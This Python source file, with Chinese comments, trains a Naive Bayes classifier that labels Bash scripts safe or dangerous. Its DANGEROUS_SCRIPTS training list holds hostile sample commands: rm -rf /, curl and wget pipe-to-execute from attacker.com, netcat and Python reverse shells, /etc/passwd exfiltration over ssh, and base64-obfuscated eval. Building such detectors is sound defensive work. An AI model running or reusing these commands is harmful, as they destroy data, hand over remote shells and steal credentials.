import re
import os
import joblib
import argparse
import logging
from typing import List, Dict, Any, Optional, Tuple

from sklearn.feature_extraction.text import CountVectorizer
from sklearn.naive_bayes import MultinomialNB
from sklearn.model_selection import train_test_split # 用于评估，虽然示例训练用全量数据
from sklearn.preprocessing import LabelEncoder
from sklearn.metrics import classification_report, accuracy_score

# --- 配置 ---
MODEL_DIR = "ml_models"
MODEL_FILE = os.path.join(MODEL_DIR, "bash_detector_model.joblib")
VECTORIZER_FILE = os.path.join(MODEL_DIR, "bash_detector_vectorizer.joblib")
LABEL_ENCODER_FILE = os.path.join(MODEL_DIR, "bash_detector_label_encoder.joblib")
LOG_FILE = "bash_detector.log"

# 配置日志记录
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# 确保模型保存目录存在
os.makedirs(MODEL_DIR, exist_ok=True)

# --- 数据合成 (用于示例训练) ---
# 在实际应用中，你需要从真实来源获取大量标注数据
SAFE_SCRIPTS = [
    "#!/bin/bash\necho 'Hello, World!'",
    "#!/bin/bash\nls -l\nexit 0",
    "#!/bin/bash\nfor i in {1..5}; do\n  echo $i\ndone",
    "#!/bin/bash\nVAR='test'\necho $VAR",
    "#!/bin/bash\nif [ -f /tmp/myfile ]; then\n  cat /tmp/myfile\nfi",
    "#!/bin/bash\n# This is a comment\nls /home",
    "#!/bin/bash\npwd",
    "#!/bin/bash\ndate",
    "#!/bin/bash\nmkdir mydir\ncd mydir",
    "#!/bin/bash\ntouch myfile.txt",
    "#!/bin/bash\ncat /etc/hosts",
]

DANGEROUS_SCRIPTS = [
    "#!/bin/bash\nrm -rf /", # 危险命令
    "#!/bin/bash\nwget http://malicious.com/payload -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware", # 下载并执行
    "#!/bin/bash\necho 'cHdk' | base64 -d | bash", # 混淆命令 (echo pwd)
    "#!/bin/bash\ncurl http://attacker.com/script | bash", # 从网络下载并执行
    "#!/bin/bash\nmkdir /tmp/backdoor && echo 'malicious content' > /tmp/backdoor/file", # 创建可疑目录/文件
    "#!/bin/bash\nnc attacker.com 4444 -e /bin/bash", # Netcat 反向 shell
    "#!/bin/bash\ncat /etc/passwd | ssh attacker@attacker.com 'cat >> /tmp/stolen_passwords'", # 数据外泄
    "#!/bin/bash\neval $(echo 'ls -l' | base64 -d)", # 混淆 eval
    "#!/bin/bash\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", # Python 反向 shell
    "#!/bin/bash\nbase64 -d <<< 'aGVsbG8='", # base64 解码
    "#!/bin/bash\ndd if=/dev/sda of=/dev/null bs=1M count=100", # 可疑的 dd 命令
]

# --- 文本预处理/特征提取 ---

def preprocess_script(script: str) -> str:
    """
    对 Bash 脚本进行简单的预处理，提取可能的“词语”或令牌。
    这里使用一个简单的正则表达式来查找单词和一些可能的符号。
    对于复杂的 Bash 语法，这可能不够完善。
    """
    # 将脚本转换为小写
    script = script.lower()
    # 移除注释行
    script = re.sub(r'#.*', '', script)
    # 使用正则表达式查找单词 (字母数字和下划线) 以及一些常见的 Bash 符号
    # 注意：这个正则非常基础，可能需要根据实际情况调整
    tokens = re.findall(r'\b\w+\b|[^\s\w]', script)
    # 过滤掉只包含空格或空字符串的 token
    tokens = [token for token in tokens if token.strip()]
    # 将 token 用空格连接起来，形成 CountVectorizer 可处理的格式
    return " ".join(tokens)

def build_vectorizer(scripts: List[str]) -> CountVectorizer:
    """
    根据脚本列表构建并拟合 CountVectorizer。
    这个 Vectorizer 定义了词汇表。
    """
    logging.info(f"开始构建词汇表，共 {len(scripts)} 个脚本。")
    vectorizer = CountVectorizer()
    processed_scripts = [preprocess_script(script) for script in scripts]
    vectorizer.fit(processed_scripts)
    logging.info(f"词汇表构建完成，包含 {len(vectorizer.vocabulary_)} 个词条。")
    return vectorizer

# --- 模型训练 ---

def train_bash_detector(safe_scripts: List[str], dangerous_scripts: List[str],
                        model_file: str = MODEL_FILE,
                        vectorizer_file: str = VECTORIZER_FILE,
                        label_encoder_file: str = LABEL_ENCODER_FILE) -> bool:
    """
    训练 Bash 脚本危险行为检测模型。

    Args:
        safe_scripts: 安全脚本列表。
        dangerous_scripts: 危险脚本列表。
        model_file: 模型保存路径。
        vectorizer_file: Vectorizer 保存路径。
        label_encoder_file: LabelEncoder 保存路径。

    Returns:
        布尔值，表示训练是否成功。
    """
    all_scripts = safe_scripts + dangerous_scripts
    labels = ["safe"] * len(safe_scripts) + ["dangerous"] * len(dangerous_scripts)

    if not all_scripts:
        logging.warning("没有提供训练数据，无法训练模型。")
        print("没有提供训练数据，无法训练模型。")
        return False

    logging.info(f"开始训练模型，共 {len(all_scripts)} 个样本。")

    # 1. 构建并保存 Vectorizer (词汇表)
    try:
        vectorizer = build_vectorizer(all_scripts)
        joblib.dump(vectorizer, vectorizer_file)
        logging.info(f"Vectorizer 已保存到 {vectorizer_file}")
    except Exception as e:
        logging.error(f"构建或保存 Vectorizer 失败: {e}")
        print(f"错误：构建或保存 Vectorizer 失败: {e}")
        return False

    # 2. 将脚本转换为特征向量
    processed_scripts = [preprocess_script(script) for script in all_scripts]
    X = vectorizer.transform(processed_scripts)

    # 3. 编码标签
    label_encoder = LabelEncoder()
    y = label_encoder.fit_transform(labels)
    try:
        joblib.dump(label_encoder, label_encoder_file)
        logging.info(f"LabelEncoder 已保存到 {label_encoder_file}")
    except Exception as e:
        logging.error(f"保存 LabelEncoder 失败: {e}")
        print(f"错误：保存 LabelEncoder 失败: {e}")
        # 即使保存 LabelEncoder 失败，模型本身可能还是训练成功的，但预测时会出问题
        # 这里选择返回 False，表示整个训练流程不完整
        return False

    # 打印标签映射关系
    label_mapping = dict(zip(label_encoder.transform(label_encoder.classes_), label_encoder.classes_))
    print(f"标签编码映射: {label_mapping}")
    logging.info(f"标签编码映射: {label_mapping}")


    # 4. 训练朴素贝叶斯模型
    model = MultinomialNB()
    try:
        model.fit(X, y)
        logging.info("模型训练完成。")
        print("模型训练完成。")
    except Exception as e:
        logging.error(f"模型训练失败: {e}")
        print(f"错误：模型训练失败: {e}")
        return False

    # 5. (可选) 评估模型 (在训练集上评估，仅供参考，实际应使用独立的测试集)
    try:
        y_pred = model.predict(X)
        accuracy = accuracy_score(y, y_pred)
        report = classification_report(y, y_pred, target_names=label_encoder.classes_)
        print("\n--- 模型在训练集上的评估报告 ---")
        print(f"准确率: {accuracy:.2f}")
        print(report)
        logging.info(f"模型在训练集上的评估完成。准确率: {accuracy:.2f}")
        logging.info(f"分类报告:\n{report}")
    except Exception as e:
         logging.warning(f"生成训练集评估报告失败: {e}")
         print(f"警告：生成训练集评估报告失败: {e}")


    # 6. 保存模型
    try:
        joblib.dump(model, model_file)
        logging.info(f"模型已保存到 {model_file}")
        print(f"模型已保存到 {model_file}")
        return True
    except Exception as e:
        logging.error(f"保存模型失败: {e}")
        print(f"错误：保存模型失败: {e}")
        return False

# --- 模型加载 ---

def load_bash_detector(model_file: str = MODEL_FILE,
                       vectorizer_file: str = VECTORIZER_FILE,
                       label_encoder_file: str = LABEL_ENCODER_FILE) -> Optional[Tuple[MultinomialNB, CountVectorizer, LabelEncoder]]:
    """
    加载训练好的 Bash 脚本危险行为检测模型、Vectorizer 和 LabelEncoder。

    Returns:
        包含模型、Vectorizer 和 LabelEncoder 的元组，如果加载失败则返回 None。
    """
    if not all(os.path.exists(f) for f in [model_file, vectorizer_file, label_encoder_file]):
        logging.error("模型文件、Vectorizer 文件或 LabelEncoder 文件未找到。请先训练模型。")
        print("错误：模型文件未找到。请先训练模型。")
        return None

    try:
        model = joblib.load(model_file)
        vectorizer = joblib.load(vectorizer_file)
        label_encoder = joblib.load(label_encoder_file)
        logging.info("成功加载 Bash 脚本检测模型文件。")
        return model, vectorizer, label_encoder
    except Exception as e:
        logging.error(f"加载模型文件失败: {e}")
        print(f"错误：加载模型文件失败: {e}")
        return None

# --- 预测函数 ---

def predict_bash_script_danger(script: str,
                               model_file: str = MODEL_FILE,
                               vectorizer_file: str = VECTORIZER_FILE,
                               label_encoder_file: str = LABEL_ENCODER_FILE) -> Optional[str]:
    """
    判断给定的 Bash 脚本字符串是否具有危险行为。

    Args:
        script: Bash 脚本字符串。
        model_file: 模型文件路径。
        vectorizer_file: Vectorizer 文件路径。
        label_encoder_file: LabelEncoder 文件路径.

    Returns:
        预测结果字符串 ('safe' 或 'dangerous')，如果模型未加载或预测失败则返回 None。
    """
    model_components = load_bash_detector(model_file, vectorizer_file, label_encoder_file)
    if model_components is None:
        return None # 模型加载失败

    model, vectorizer, label_encoder = model_components

    logging.info("开始预测 Bash 脚本危险性。")

    try:
        # 1. 预处理脚本
        processed_script = preprocess_script(script)

        # 2. 将预处理后的脚本转换为特征向量
        # 注意：这里使用 vectorizer.transform 而不是 fit_transform
        X = vectorizer.transform([processed_script])

        # 3. 进行预测
        predicted_encoded = model.predict(X)

        # 4. 解码预测结果
        predicted_label = label_encoder.inverse_transform(predicted_encoded)

        logging.info(f"预测结果: {predicted_label[0]}")
        return predicted_label[0]

    except Exception as e:
        logging.error(f"预测 Bash 脚本危险性失败: {e}")
        print(f"错误：预测 Bash 脚本危险性失败: {e}")
        return None

# --- 示例用法 (在 __main__ 块中) ---

if __name__ == "__main__":
    # 命令行参数解析
    parser = argparse.ArgumentParser(description="Bash 脚本危险行为检测工具")
    parser.add_argument('--train', action='store_true', help="训练模型")
    parser.add_argument('--predict', type=str, help="预测给定的 Bash 脚本字符串的危险性")
    parser.add_argument('--predict_file', type=str, help="预测指定 Bash 脚本文件的危险性")

    args = parser.parse_args()

    if args.train:
        print("--- 训练 Bash 脚本检测模型 ---")
        train_bash_detector(SAFE_SCRIPTS, DANGEROUS_SCRIPTS)
        print("-" * 30)

    if args.predict:
        print("\n--- 预测 Bash 脚本危险性 ---")
        script_to_predict = args.predict
        print(f"待检测脚本:\n---\n{script_to_predict}\n---")
        prediction = predict_bash_script_danger(script_to_predict)
        if prediction:
            print(f"预测结果: {prediction}")
        else:
            print("预测失败。")
        print("-" * 30)

    if args.predict_file:
        print("\n--- 预测 Bash 脚本文件危险性 ---")
        script_file_path = args.predict_file
        try:
            with open(script_file_path, 'r', encoding='utf-8') as f:
                script_to_predict = f.read()
            print(f"待检测文件: {script_file_path}")
            print(f"文件内容:\n---\n{script_to_predict}\n---")
            prediction = predict_bash_script_danger(script_to_predict)
            if prediction:
                print(f"预测结果: {prediction}")
            else:
                print("预测失败。")
        except FileNotFoundError:
            print(f"错误：文件未找到: {script_file_path}")
        except Exception as e:
            print(f"错误：读取文件失败: {e}")
        print("-" * 30)

    # 如果没有提供任何参数，打印使用说明
    if not any([args.train, args.predict, args.predict_file]):
        parser.print_help()

